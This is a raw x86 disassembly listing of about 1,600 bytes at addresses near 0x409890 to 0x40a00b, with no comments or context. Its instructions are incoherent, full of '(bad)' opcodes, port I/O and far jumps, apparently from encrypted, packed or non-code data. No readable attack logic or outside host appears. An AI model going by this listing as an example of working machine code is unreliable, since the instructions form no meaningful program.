  40988c:	cmp    BYTE PTR [edx+0x55dfd6b],0xb3
  409893:	and    DWORD PTR [edx+0x5c],0xffffffe4
  409897:	out    dx,al
  409898:	jmp    0x40983f
  40989a:	pop    eax
  40989b:	push   esi
  40989c:	push   esp
  40989d:	ror    BYTE PTR [edi+0x40],1
  4098a0:	add    al,0xf3
  4098a2:	mov    ebx,0xac21ba65
  4098a7:	arpl   WORD PTR ds:0x1ab94a3b,bp
  4098ad:	call   0xabe2:0xf061379e
  4098b4:	pop    eax
  4098b5:	aaa    
  4098b6:	std    
  4098b7:	dec    esp
  4098b8:	cmp    edx,DWORD PTR [edi]
  4098ba:	inc    edx
  4098bb:	xchg   ebp,eax
  4098bc:	ins    BYTE PTR es:[edi],dx
  4098bd:	mov    BYTE PTR [eax],dh
  4098bf:	jb     0x4098ae
  4098c1:	mov    bl,0x9d
  4098c3:	int    0xd3
  4098c5:	lds    ecx,FWORD PTR [esi+ecx*8-0x12195680]
  4098cc:	scas   al,BYTE PTR es:[edi]
  4098cd:	or     esp,DWORD PTR [edi+eiz*2]
  4098d0:	fsubr  DWORD PTR [ecx*2-0x871c11c]
  4098d7:	adc    ah,bh
  4098d9:	mov    edx,0xf46e3de
  4098de:	lods   al,BYTE PTR ds:[esi]
  4098df:	imul   esi,DWORD PTR [ebx+0x3e],0xffffffea
  4098e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098e4:	jae    0x40993b
  4098e6:	sar    DWORD PTR [ebx],1
  4098e8:	call   0xe417b05d
  4098ed:	or     al,0xbd
  4098ef:	inc    edi
  4098f0:	mov    dh,0x4a
  4098f2:	mov    ds:0xb92d0043,al
  4098f7:	and    DWORD PTR [eax+0x796282c],edx
  4098fd:	scas   al,BYTE PTR es:[edi]
  4098fe:	adc    esi,DWORD PTR [eax+0x76cb2c9c]
  409904:	jo     0x40996a
  409906:	inc    esi
  409907:	sbb    ch,BYTE PTR [edx]
  409909:	dec    esp
  40990a:	push   0x50f61e0
  40990f:	fiadd  DWORD PTR [ebx+0x6a6ed649]
  409915:	daa    
  409916:	mov    ds:0x9866dde0,eax
  40991b:	sbb    ecx,DWORD PTR [edx+0x2caa16e]
  409921:	jno    0x4098c1
  409923:	and    ah,BYTE PTR [ebx-0x4e]
  409926:	or     al,0x1f
  409928:	es out dx,eax
  40992a:	rcl    DWORD PTR ds:0xab6999b8,1
  409930:	mov    eax,ds:0xe7ffd68
  409935:	stos   DWORD PTR es:[edi],eax
  409936:	pop    es
  409937:	stos   DWORD PTR es:[edi],eax
  409938:	mov    edx,0x8041ca2f
  40993d:	stc    
  40993e:	test   BYTE PTR [eax],al
  409940:	in     al,0x44
  409942:	mov    ecx,0xcb698b1e
  409947:	xor    DWORD PTR [edi+0x4d],esi
  40994a:	jge    0x409951
  40994c:	retf   
  40994d:	mov    ds:0x9ddad853,eax
  409952:	scas   eax,DWORD PTR es:[edi]
  409953:	xor    al,0x53
  409955:	adc    eax,0x3c330700
  40995a:	js     0x409941
  40995c:	mov    DWORD PTR [ebp-0x72616f3d],esi
  409962:	pop    ebx
  409963:	rcl    dh,0xa3
  409966:	cmp    bh,BYTE PTR [esi+0x26d99c32]
  40996c:	sahf   
  40996d:	push   0xffffff95
  40996f:	stos   DWORD PTR es:[edi],eax
  409970:	xchg   edi,eax
  409971:	push   ebp
  409972:	repz cmp DWORD PTR [ebx],ebp
  409975:	push   edx
  409976:	repnz push cs
  409978:	dec    edi
  409979:	ret    
  40997a:	jns    0x4099d2
  40997c:	pop    ebx
  40997d:	jmp    0x1e5f6902
  409982:	retf   0xd076
  409985:	sub    edi,DWORD PTR [ecx]
  409987:	shr    DWORD PTR [ebx],cl
  409989:	addr16 mov al,ds:0xa7d7
  40998d:	mov    al,ds:0x413c6d53
  409992:	sub    BYTE PTR [eax+0x580e85c2],al
  409998:	xlat   BYTE PTR ds:[ebx]
  409999:	repnz out dx,al
  40999b:	cs inc ebx
  40999d:	int3   
  40999e:	retf   0xf284
  4099a1:	push   edx
  4099a2:	adc    eax,0xf99f9783
  4099a7:	imul   ebx,DWORD PTR [ebx+0x74],0x133c3c1a
  4099ae:	fisubr WORD PTR es:[edi+0x28b231cc]
  4099b5:	xchg   DWORD PTR [edx-0xd],edx
  4099b8:	in     al,dx
  4099b9:	(bad)  
  4099bb:	xor    cl,ch
  4099bd:	stc    
  4099be:	(bad)  
  4099bf:	pop    ecx
  4099c0:	bound  esp,QWORD PTR [ebp+edi*8-0x3742dbab]
  4099c7:	loopne 0x40998e
  4099c9:	push   ebx
  4099ca:	retf   0x5c62
  4099cd:	xor    eax,0x4ee20fae
  4099d2:	ret    
  4099d3:	daa    
  4099d4:	or     eax,0xf21c9d4a
  4099d9:	out    0xf7,eax
  4099db:	lds    ebx,FWORD PTR [edx]
  4099dd:	xchg   esi,eax
  4099de:	(bad)  
  4099df:	jl     0x4099e8
  4099e1:	test   BYTE PTR [esi],dh
  4099e3:	fnstcw WORD PTR [eax-0x67]
  4099e6:	xchg   edx,eax
  4099e7:	ja     0x409a61
  4099e9:	xchg   DWORD PTR [eax+eax*8+0x599028b0],ebx
  4099f0:	jae    0x4099c8
  4099f2:	rcl    BYTE PTR ds:0x6201ab31,0x83
  4099f9:	and    DWORD PTR [ebp+0x76c36bb0],ecx
  4099ff:	sbb    ah,BYTE PTR [eax-0x77]
  409a02:	dec    edi
  409a03:	mov    ebp,0x5910e4b8
  409a08:	mov    dh,0xbb
  409a0a:	addr16 mov dl,0x2f
  409a0d:	xchg   edx,eax
  409a0e:	bound  esp,QWORD PTR [ebp+0x57cf097b]
  409a14:	outs   dx,BYTE PTR ds:[esi]
  409a15:	call   0xf59a:0x885c0d63
  409a1c:	in     eax,0x62
  409a1e:	sub    bh,al
  409a20:	ror    BYTE PTR [ebx],cl
  409a22:	js     0x409a51
  409a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a25:	xchg   esi,eax
  409a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a27:	push   ecx
  409a28:	ret    
  409a29:	cs push ebp
  409a2b:	dec    esp
  409a2c:	pop    es
  409a2d:	jge    0x4099c7
  409a2f:	dec    eax
  409a30:	es fs icebp 
  409a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a34:	add    dl,bh
  409a36:	jp     0x409aa6
  409a38:	int3   
  409a39:	stc    
  409a3a:	out    dx,eax
  409a3b:	pop    esp
  409a3c:	pop    esp
  409a3d:	push   0xabfcb240
  409a42:	push   esp
  409a43:	cdq    
  409a44:	mov    dl,0x7b
  409a46:	pop    eax
  409a47:	sub    eax,0xfb7b5438
  409a4c:	hlt    
  409a4d:	jno    0x409aca
  409a4f:	sbb    eax,0xf99a640
  409a54:	xchg   ecx,eax
  409a55:	icebp  
  409a56:	mov    ds:0xdbd95870,eax
  409a5b:	in     eax,0x32
  409a5d:	scas   al,BYTE PTR es:[edi]
  409a5e:	retf   
  409a5f:	adc    bh,dl
  409a61:	shl    esi,0x2f
  409a64:	inc    esi
  409a65:	adc    al,0xd9
  409a67:	adc    bl,BYTE PTR [esi+eax*2]
  409a6a:	mov    ebx,0x3afa26fc
  409a6f:	ja     0x409a06
  409a71:	jecxz  0x409a01
  409a73:	inc    eax
  409a74:	fisub  DWORD PTR [ecx]
  409a76:	jge    0x409ab1
  409a78:	in     al,0x19
  409a7a:	inc    ebx
  409a7b:	adc    DWORD PTR [ebx+ebx*4],ecx
  409a7e:	sbb    DWORD PTR [ebp+0xc],esi
  409a81:	pusha  
  409a82:	mov    esp,0xd247533b
  409a87:	int    0xdd
  409a89:	in     al,0x89
  409a8b:	push   ebx
  409a8c:	hlt    
  409a8d:	mov    eax,0x21412e62
  409a92:	cmc    
  409a93:	stos   DWORD PTR es:[edi],eax
  409a94:	icebp  
  409a95:	stos   DWORD PTR es:[edi],eax
  409a96:	dec    ebp
  409a97:	jmp    0xeeba:0xa927040c
  409a9e:	in     al,dx
  409a9f:	repnz sbb BYTE PTR [edi+0x30],bh
  409aa3:	sub    al,0xb2
  409aa5:	(bad)  
  409aa6:	idiv   BYTE PTR [ecx+0x3ccd4437]
  409aac:	xor    BYTE PTR [ecx],ah
  409aae:	add    ebp,DWORD PTR [ecx+ebp*1]
  409ab1:	mov    esi,0x5dd963b
  409ab6:	mov    dl,0x70
  409ab8:	fisubr DWORD PTR [edx-0xc]
  409abb:	jmp    0x594f:0x9ea896fb
  409ac2:	es inc eax
  409ac4:	push   ds
  409ac5:	mov    bh,BYTE PTR [ebx+edi*4]
  409ac8:	(bad)  
  409ac9:	fsub   DWORD PTR [edx-0x60c3a5de]
  409acf:	cmp    BYTE PTR [eax],0xad
  409ad2:	mov    DWORD PTR [ebp+edi*1-0x16c6f5d5],esi
  409ad9:	jl     0x409b1f
  409adb:	cmp    eax,0x39a829e2
  409ae0:	and    al,0x81
  409ae2:	addr16 int3 
  409ae4:	cwde   
  409ae5:	lea    edi,ds:[edi+0x41]
  409ae9:	add    edx,DWORD PTR [edi]
  409aeb:	cwde   
  409aec:	jl     0x409b4f
  409aee:	ds jbe 0x409aac
  409af1:	and    esp,esp
  409af3:	jle    0x409ad8
  409af5:	mov    DWORD PTR [edx],ecx
  409af7:	stos   DWORD PTR es:[edi],eax
  409af8:	in     eax,dx
  409af9:	addr16 xchg ebp,eax
  409afb:	dec    ebp
  409afc:	daa    
  409afd:	iret   
  409afe:	push   ebx
  409aff:	jle    0x409b14
  409b01:	int3   
  409b02:	pop    edi
  409b03:	not    esp
  409b05:	sahf   
  409b06:	mov    cl,0x71
  409b08:	mov    ch,0x5a
  409b0a:	fidiv  WORD PTR [esi+0x2febee32]
  409b10:	jbe    0x409b5a
  409b12:	mov    al,BYTE PTR [esp+edi*1-0x10]
  409b16:	fnstcw WORD PTR [edi]
  409b18:	push   cs
  409b19:	out    dx,al
  409b1a:	add    eax,0x72523bc4
  409b1f:	test   edi,0x2b2711ff
  409b25:	sbb    al,0x43
  409b27:	inc    DWORD PTR [edx-0xd]
  409b2a:	scas   eax,DWORD PTR es:[edi]
  409b2b:	dec    edi
  409b2c:	daa    
  409b2d:	loop   0x409ab2
  409b2f:	cld    
  409b30:	cmc    
  409b31:	lods   eax,DWORD PTR ds:[esi]
  409b32:	jmp    0x409b6d
  409b34:	enter  0x4a8f,0xe7
  409b38:	or     eax,0x75761c25
  409b3d:	nop
  409b3e:	sahf   
  409b3f:	xchg   ebp,eax
  409b40:	adc    eax,0xf9a718d3
  409b45:	in     eax,dx
  409b46:	in     eax,dx
  409b47:	popa   
  409b48:	loopne 0x409ae8
  409b4a:	jecxz  0x409af9
  409b4c:	rol    ebp,0x1a
  409b4f:	out    dx,eax
  409b50:	aas    
  409b51:	sbb    ecx,ecx
  409b53:	fucom  st(0)
  409b55:	or     DWORD PTR [edi],0xffffffb5
  409b58:	rcr    BYTE PTR [ebp+0x44],1
  409b5b:	bound  ebx,QWORD PTR ss:[ecx-0x6]
  409b5f:	pop    edx
  409b60:	inc    edx
  409b61:	or     al,0x2
  409b63:	or     ecx,eax
  409b65:	setp   dh
  409b68:	xor    esp,esp
  409b6a:	ror    DWORD PTR ds:0xeb4c1276,cl
  409b70:	jecxz  0x409bc3
  409b72:	mov    eax,0x6b4f5677
  409b77:	(bad)  
  409b79:	jmp    0x5353:0x6e2f7526
  409b80:	xchg   edx,eax
  409b81:	fnstcw WORD PTR ds:[edx-0x45]
  409b85:	push   ebp
  409b86:	xchg   ecx,eax
  409b87:	add    al,0xa4
  409b89:	push   DWORD PTR [edx+0xa34921d]
  409b8f:	jecxz  0x409b2a
  409b91:	pushf  
  409b92:	scas   al,BYTE PTR es:[edi]
  409b93:	push   0x7d99ae0e
  409b98:	add    BYTE PTR [esi+0x31],dh
  409b9b:	push   0xfffffffe
  409b9d:	mov    DWORD PTR [ecx+0x27],edx
  409ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba1:	jle    0x409b65
  409ba3:	push   0xffffffad
  409ba5:	ins    BYTE PTR es:[edi],dx
  409ba6:	inc    ecx
  409ba7:	loopne 0x409b31
  409ba9:	xor    dh,BYTE PTR [edi-0x6f726d3e]
  409baf:	adc    ecx,eax
  409bb1:	fisubr DWORD PTR [bx+si+0x13]
  409bb5:	shr    bl,cl
  409bb7:	shl    DWORD PTR [edx+eiz*2-0x5eefd991],cl
  409bbe:	loop   0x409c3c
  409bc0:	jno    0x409ba8
  409bc2:	mov    fs,esi
  409bc4:	inc    esp
  409bc5:	pop    esi
  409bc6:	into   
  409bc7:	inc    ebx
  409bc8:	mov    ss,ecx
  409bca:	adc    al,0x2b
  409bcc:	mov    al,0x3
  409bce:	mov    ds:0x96825f46,eax
  409bd3:	xchg   DWORD PTR [ecx],ebx
  409bd5:	jecxz  0x409bc1
  409bd7:	push   0xb3670cea
  409bdc:	stos   BYTE PTR es:[edi],al
  409bdd:	repz xor edi,ecx
  409be0:	fst    DWORD PTR [ebx-0x743ab99a]
  409be6:	lds    esi,FWORD PTR [eax-0x2707e46c]
  409bec:	jno    0x409bf6
  409bee:	nop
  409bef:	cli    
  409bf0:	loop   0x409c38
  409bf2:	xchg   edi,eax
  409bf3:	and    ebp,ebx
  409bf5:	ficom  WORD PTR ds:0x15c99759
  409bfb:	add    BYTE PTR [edi+0x580fd3e0],0xdb
  409c02:	out    dx,al
  409c03:	sub    al,0xe7
  409c05:	pop    ebx
  409c06:	enter  0xaa18,0x3b
  409c0a:	cmp    al,BYTE PTR [ecx]
  409c0c:	in     eax,dx
  409c0d:	xchg   ebp,eax
  409c0e:	ret    0x9b77
  409c11:	cmp    cl,al
  409c13:	pushf  
  409c14:	pop    edx
  409c15:	push   ebp
  409c16:	push   esi
  409c17:	loope  0x409c78
  409c19:	mov    ss,WORD PTR ds:0xe1dcefbc
  409c1f:	mov    dl,BYTE PTR [edi+eax*1]
  409c22:	jmp    0xc93a84bd
  409c27:	stc    
  409c28:	jb     0x409bec
  409c2a:	fild   WORD PTR [esi+eiz*4-0x26]
  409c2e:	int    0x85
  409c30:	inc    edx
  409c31:	aam    0x34
  409c33:	out    dx,al
  409c34:	fs cdq 
  409c36:	cmp    BYTE PTR [edx+0x28],bh
  409c39:	retf   0x181a
  409c3c:	outs   dx,DWORD PTR ds:[esi]
  409c3d:	sbb    eax,eax
  409c3f:	mov    DWORD PTR [ebp+0x2],ecx
  409c42:	aas    
  409c43:	mov    edx,0x1f6e11ba
  409c48:	jo     0x409bf2
  409c4a:	inc    edi
  409c4b:	jnp    0x409c55
  409c4d:	call   0x5aa3795
  409c52:	mov    ch,0x1e
  409c54:	pop    ebp
  409c55:	stc    
  409c56:	ja     0x409cb7
  409c58:	or     DWORD PTR [ebp-0x66],edi
  409c5b:	in     al,dx
  409c5c:	mov    edx,0xe610976e
  409c61:	fidiv  DWORD PTR ds:0x4d46914d
  409c67:	ins    BYTE PTR es:[edi],dx
  409c68:	outs   dx,BYTE PTR ds:[esi]
  409c69:	shr    DWORD PTR [edx],1
  409c6b:	(bad)  
  409c6c:	pop    eax
  409c6d:	jno    0x409ce4
  409c6f:	xchg   ebx,eax
  409c70:	pop    ss
  409c71:	test   ch,0x1f
  409c74:	sub    esi,DWORD PTR [ebx]
  409c76:	dec    ebx
  409c77:	ins    BYTE PTR es:[edi],dx
  409c78:	call   0x98e7:0x578e136e
  409c7f:	enter  0x2881,0x6c
  409c83:	push   0xffffff92
  409c85:	xchg   ebx,eax
  409c86:	mov    DWORD PTR [edx+0x4d],eax
  409c89:	into   
  409c8a:	adc    al,BYTE PTR [eax-0x33a09f98]
  409c90:	(bad)  
  409c91:	int    0xe6
  409c93:	ins    BYTE PTR es:[edi],dx
  409c94:	dec    edi
  409c95:	mov    dl,0x11
  409c97:	inc    esi
  409c98:	fwait
  409c99:	pusha  
  409c9a:	mov    ds:0xede20236,eax
  409c9f:	pop    edx
  409ca0:	cmp    edi,DWORD PTR [esi]
  409ca2:	or     ecx,DWORD PTR [ebx+0x3b]
  409ca5:	sub    eax,DWORD PTR [edx+0x1b57ca21]
  409cab:	repnz mov ch,0x1
  409cae:	fimul  WORD PTR [edi-0x58a3e362]
  409cb4:	(bad)  [eax+0x39af138a]
  409cba:	loop   0x409c72
  409cbc:	mov    eax,ds:0x44801c58
  409cc1:	out    dx,al
  409cc2:	add    DWORD PTR [ecx],0x3b4b06bd
  409cc8:	lods   eax,DWORD PTR ds:[esi]
  409cc9:	pop    eax
  409cca:	pop    ds
  409ccb:	int    0xb6
  409ccd:	sub    esi,0xfffffff8
  409cd0:	lods   eax,DWORD PTR ds:[esi]
  409cd1:	lea    ebx,[esi-0x7a]
  409cd4:	pop    eax
  409cd5:	pmaxub mm3,QWORD PTR [edx-0xc]
  409cd9:	test   al,0xe9
  409cdb:	and    eax,0x3fdf73e1
  409ce0:	pop    ds
  409ce1:	shl    DWORD PTR [edx],cl
  409ce3:	mov    eax,0x490c84d7
  409ce8:	clc    
  409ce9:	cmp    esi,esi
  409ceb:	iret   
  409cec:	fsubr  QWORD PTR [ecx]
  409cee:	inc    ebp
  409cef:	push   edx
  409cf0:	jbe    0x409d2a
  409cf2:	add    eax,0x4424d380
  409cf7:	xor    eax,0xc9a25f01
  409cfc:	xchg   edx,eax
  409cfd:	jae    0x409d42
  409cff:	and    edx,esi
  409d01:	arpl   WORD PTR [edi-0x24],cx
  409d04:	(bad)  
  409d05:	rcl    DWORD PTR [eax+0x71d4c14d],cl
  409d0b:	daa    
  409d0c:	and    bh,BYTE PTR [edx]
  409d0e:	cmp    eax,0xdf582175
  409d13:	pop    edi
  409d14:	xlat   BYTE PTR ds:[ebx]
  409d15:	xchg   ebx,eax
  409d16:	jecxz  0x409cbb
  409d18:	aad    0xf6
  409d1a:	jae    0x409cb6
  409d1c:	and    al,0x93
  409d1e:	dec    esp
  409d1f:	jp     0x409ccd
  409d21:	nop
  409d22:	and    esp,esi
  409d24:	fwait
  409d25:	ror    dl,cl
  409d27:	inc    ebx
  409d28:	pop    esi
  409d29:	imul   esi,ecx,0x3674e63a
  409d2f:	test   al,0xc9
  409d31:	mov    al,0x7b
  409d33:	leave  
  409d34:	jo     0x409d41
  409d36:	enter  0x7198,0x55
  409d3a:	outs   dx,DWORD PTR ds:[esi]
  409d3b:	pop    edi
  409d3c:	fmul   st,st(2)
  409d3e:	loopne 0x409d1f
  409d40:	sub    bh,BYTE PTR [ecx+0x15]
  409d43:	faddp  st(6),st
  409d45:	in     eax,dx
  409d46:	jecxz  0x409d87
  409d48:	or     edx,DWORD PTR [eax-0x61]
  409d4b:	ja     0x409cf0
  409d4d:	stc    
  409d4e:	mov    eax,0xafa22bba
  409d53:	inc    esi
  409d54:	pop    esi
  409d55:	mov    bh,0x29
  409d57:	mov    eax,ds:0x259f7fa
  409d5c:	push   edi
  409d5d:	jg     0x409d3b
  409d5f:	es jbe 0x409d62
  409d62:	(bad)  
  409d63:	sub    eax,0xfb0cda53
  409d68:	stc    
  409d69:	push   edx
  409d6a:	and    al,dh
  409d6c:	add    DWORD PTR [edx],edx
  409d6e:	ds stos DWORD PTR es:[edi],eax
  409d70:	iret   
  409d71:	rol    ch,1
  409d73:	jo     0x409d8b
  409d75:	xchg   BYTE PTR [edx-0x6d],dl
  409d78:	popa   
  409d79:	sub    eax,0x5893c1c3
  409d7e:	inc    esi
  409d7f:	pop    esi
  409d80:	imul   DWORD PTR [eax+eax*8-0x3725e5dd]
  409d87:	sbb    DWORD PTR [esi+0x5e],0xffffffe5
  409d8b:	ror    BYTE PTR [eax],cl
  409d8d:	cmp    DWORD PTR [eax+0x63],esp
  409d90:	sub    eax,0xce7cef3
  409d95:	xchg   esp,eax
  409d96:	data16 jl 0x409de5
  409d99:	lock mov ah,0x6e
  409d9c:	push   ecx
  409d9d:	xor    esp,DWORD PTR [esi-0x7a48e91f]
  409da3:	push   edx
  409da4:	mov    cl,0x8f
  409da6:	(bad)  
  409da7:	out    dx,al
  409da8:	das    
  409da9:	(bad)
  409dac:	push   ebp
  409dad:	sbb    DWORD PTR [edx],0x58881d5a
  409db3:	mov    edx,0xe487954e
  409db8:	sti    
  409db9:	inc    esi
  409dba:	ja     0x409d45
  409dbc:	add    eax,0x903759ed
  409dc1:	or     DWORD PTR [ebx-0x1605b826],0xffffffae
  409dc8:	arpl   di,ax
  409dca:	iret   
  409dcb:	xchg   BYTE PTR [ecx],ch
  409dcd:	push   edi
  409dce:	jge    0x409e0a
  409dd0:	repnz lock pop ds
  409dd3:	inc    ecx
  409dd4:	fwait
  409dd5:	int3   
  409dd6:	mov    ebp,0xd4b69dfd
  409ddb:	sub    al,0x24
  409ddd:	(bad)  
  409dde:	adc    edi,DWORD PTR [edi-0x1546797d]
  409de4:	ja     0x409e4a
  409de6:	mov    ch,0xde
  409de8:	dec    esp
  409de9:	(bad)  
  409dea:	addr16 inc ebp
  409dec:	ds loope 0x409e10
  409def:	cmp    BYTE PTR fs:[ebx],0xed
  409df3:	in     eax,0xfa
  409df5:	pop    ebp
  409df6:	push   eax
  409df7:	jg     0x409dd5
  409df9:	pop    edx
  409dfa:	lods   al,BYTE PTR ds:[esi]
  409dfb:	xchg   ecx,eax
  409dfc:	dec    ebx
  409dfd:	jbe    0x409e6e
  409dff:	retf   0xc24e
  409e02:	pop    esp
  409e03:	pop    esi
  409e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e05:	je     0x409e53
  409e07:	xchg   ecx,eax
  409e08:	stos   DWORD PTR es:[edi],eax
  409e09:	sub    al,0xc5
  409e0b:	repnz imul esi,DWORD PTR [esp+edi*1-0x5bd887f],0xd56d0ef5
  409e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e18:	and    eax,0x75d224cb
  409e1d:	cmp    DWORD PTR [edx],eax
  409e1f:	jns    0x409ddd
  409e21:	(bad)  
  409e22:	aad    0x37
  409e24:	mov    ebx,0x42e9d135
  409e29:	add    al,0x11
  409e2b:	outs   dx,DWORD PTR ds:[esi]
  409e2c:	cmc    
  409e2d:	push   edi
  409e2e:	mov    esp,0xcb624de0
  409e33:	test   DWORD PTR [edi],eax
  409e35:	cmp    DWORD PTR [edx+0x537436ca],esi
  409e3b:	add    al,0xb0
  409e3d:	pop    ecx
  409e3e:	out    dx,al
  409e3f:	loop   0x409e6c
  409e41:	(bad)  
  409e42:	cli    
  409e43:	adc    BYTE PTR [eax+eax*2],ch
  409e46:	inc    eax
  409e47:	mov    ecx,0x7b4d304a
  409e4c:	popf   
  409e4d:	aaa    
  409e4e:	cdq    
  409e4f:	add    dl,bh
  409e51:	cdq    
  409e52:	ret    0xfd23
  409e55:	add    eax,0xdce2b724
  409e5a:	fwait
  409e5b:	pop    esp
  409e5c:	mov    eax,0x505611e5
  409e61:	or     eax,0xb44b0ac5
  409e66:	scas   eax,DWORD PTR es:[edi]
  409e67:	push   0x14
  409e69:	dec    esi
  409e6a:	pop    esi
  409e6b:	add    eax,0x477eeef7
  409e70:	or     BYTE PTR [edi],dl
  409e72:	les    edx,FWORD PTR [edx]
  409e74:	mov    ebp,0x54721fbd
  409e79:	es mov eax,0x33b72bce
  409e7f:	sbb    eax,0xfff1d36d
  409e84:	les    edx,FWORD PTR [eax+0x36]
  409e87:	push   0x20017849
  409e8c:	aad    0x6d
  409e8e:	cmp    al,0x78
  409e90:	hlt    
  409e91:	inc    esi
  409e92:	xchg   ebx,eax
  409e93:	jmp    0x409e43
  409e95:	xlat   BYTE PTR ds:[ebx]
  409e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e97:	sub    esi,DWORD PTR cs:[eax+ecx*4+0x37]
  409e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e9d:	out    0x4a,al
  409e9f:	jge    0x409e6b
  409ea1:	push   eax
  409ea2:	mov    ?,eax
  409ea4:	shl    DWORD PTR [edx],cl
  409ea6:	mov    ah,0x51
  409ea8:	dec    ecx
  409ea9:	mov    eax,ds:0xe31baf03
  409eae:	inc    edx
  409eaf:	das    
  409eb0:	jl     0x409e40
  409eb2:	mov    esp,0xfc94f6fa
  409eb7:	fiadd  WORD PTR [ebx+0x39]
  409eba:	in     eax,dx
  409ebb:	push   0x4
  409ebd:	xchg   ebx,eax
  409ebe:	sub    al,0xa5
  409ec0:	pop    edi
  409ec1:	add    ebp,ecx
  409ec3:	shr    dh,0x37
  409ec6:	push   0xffffffa5
  409ec8:	jns    0x409e84
  409eca:	shr    BYTE PTR [eax+esi*2-0x3a],1
  409ece:	cld    
  409ecf:	out    0x5d,eax
  409ed1:	xlat   BYTE PTR ds:[ebx]
  409ed2:	or     BYTE PTR [edx-0x59],dh
  409ed5:	xor    ebp,DWORD PTR [esi+ebx*8]
  409ed8:	push   edx
  409ed9:	lds    esi,FWORD PTR [ecx]
  409edb:	cmp    esp,DWORD PTR [edx+0x10]
  409ede:	cmp    DWORD PTR [ebp+0x7b],edx
  409ee1:	inc    esp
  409ee2:	ja     0x409e9d
  409ee4:	or     DWORD PTR [ebp+0x2a91db9e],0x476099ff
  409eee:	jl     0x409ef1
  409ef0:	sahf   
  409ef1:	push   es
  409ef2:	scas   al,BYTE PTR es:[edi]
  409ef3:	jge    0x409f10
  409ef5:	mov    ebx,0xb3b70228
  409efa:	adc    eax,0xf09a1fe5
  409eff:	ror    BYTE PTR [esi],0xc0
  409f02:	js     0x409f63
  409f04:	ret    0x8400
  409f07:	idiv   BYTE PTR ds:0x2147fd2d
  409f0d:	das    
  409f0e:	es push esp
  409f10:	inc    edi
  409f11:	out    dx,al
  409f12:	xchg   ecx,eax
  409f13:	mov    ecx,0xea9fd89d
  409f18:	jecxz  0x409f07
  409f1a:	sbb    ah,BYTE PTR [eax-0x1dffd958]
  409f20:	inc    esp
  409f21:	imul   DWORD PTR [ebp-0xb]
  409f24:	scas   al,BYTE PTR es:[edi]
  409f25:	inc    edx
  409f26:	xchg   ecx,eax
  409f27:	mov    ds:0xfbd0b9f7,eax
  409f2c:	popf   
  409f2d:	inc    edx
  409f2e:	sbb    eax,0xd79334e7
  409f33:	sti    
  409f34:	sbb    al,0x83
  409f36:	scas   al,BYTE PTR es:[edi]
  409f37:	enter  0x4de6,0xe0
  409f3b:	mov    ebx,0x6202e020
  409f40:	aas    
  409f41:	jne    0x409f2e
  409f43:	stos   DWORD PTR es:[edi],eax
  409f44:	add    eax,0xab2f3bd1
  409f49:	adc    DWORD PTR ds:0x85561c68,ebx
  409f4f:	jno    0x409f5e
  409f51:	sbb    DWORD PTR [esp+ebp*1+0x17],ebp
  409f55:	js     0x409f14
  409f57:	retf   
  409f58:	pop    edi
  409f59:	dec    edx
  409f5a:	push   ebp
  409f5b:	nop
  409f5c:	mov    ds,WORD PTR [esi+esi*1]
  409f5f:	int3   
  409f60:	xor    ah,ch
  409f62:	sub    DWORD PTR [esi-0x113319ef],edx
  409f68:	ins    DWORD PTR es:[edi],dx
  409f69:	cld    
  409f6a:	add    DWORD PTR [edi-0x3f68c1d],edi
  409f70:	fwait
  409f71:	outs   dx,DWORD PTR ds:[esi]
  409f72:	sbb    ebx,DWORD PTR [edi+0x44]
  409f75:	xor    al,0x78
  409f77:	jne    0x409f66
  409f79:	test   al,0xcd
  409f7b:	lods   al,BYTE PTR ds:[esi]
  409f7c:	stos   DWORD PTR es:[edi],eax
  409f7d:	jbe    0x409fb9
  409f7f:	fld    QWORD PTR [edi]
  409f81:	jne    0x409f04
  409f83:	imul   ebp,DWORD PTR [ebp+0x46],0xd4acae43
  409f8a:	sbb    eax,0xf642774c
  409f8f:	sub    BYTE PTR [ecx-0x34],dl
  409f92:	fdivrp st(7),st
  409f94:	out    dx,eax
  409f95:	add    al,BYTE PTR [edx-0x6d]
  409f98:	mov    DWORD PTR [eax-0x18],edx
  409f9b:	hlt    
  409f9c:	push   ss
  409f9d:	and    al,bh
  409f9f:	(bad)  
  409fa0:	cmp    al,BYTE PTR [ebp+0x1d]
  409fa3:	repnz fcmovnb st,st(1)
  409fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fa7:	and    edx,DWORD PTR [ebp+0x3c]
  409faa:	add    al,0x38
  409fac:	in     al,0xb8
  409fae:	adc    ch,BYTE PTR [edi-0x14]
  409fb1:	xchg   BYTE PTR [edi-0x18],dh
  409fb4:	aad    0xe0
  409fb6:	leave  
  409fb7:	dec    ebx
  409fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb9:	jno    0x409fb0
  409fbb:	xchg   BYTE PTR [edx-0x23],dl
  409fbe:	sub    esi,eax
  409fc0:	mov    cl,0x24
  409fc2:	in     al,0x68
  409fc4:	jmp    0x598095
  409fc9:	jo     0x40a049
  409fcb:	cmp    DWORD PTR [esi+0x29202c],ebx
  409fd1:	mov    ?,WORD PTR [ebp+0x59]
  409fd4:	and    BYTE PTR [eax],al
  409fd6:	dec    ebp
  409fd7:	stc    
  409fd8:	in     eax,0xb1
  409fda:	add    al,0x14
  409fdc:	ret    
  409fdd:	lock sbb DWORD PTR [edx],edx
  409fe0:	adc    eax,0xb7b69285
  409fe5:	push   edi
  409fe6:	sbb    edi,eax
  409fe8:	mov    WORD PTR [ebx-0x16],gs
  409feb:	arpl   WORD PTR [ecx],dx
  409fed:	ror    BYTE PTR [eax-0x47],cl
  409ff0:	das    
  409ff1:	jns    0x40a03b
  409ff3:	and    eax,0x982372b0
  409ff8:	push   edx
  409ff9:	aas    
  409ffa:	stos   BYTE PTR es:[edi],al
  409ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ffc:	fistp  WORD PTR [ecx+0x2e]
  409fff:	jae    0x40a07c
  40a001:	push   0xdcf90137
  40a006:	mov    eax,0xc35d85ea
  40a00b:	leave  
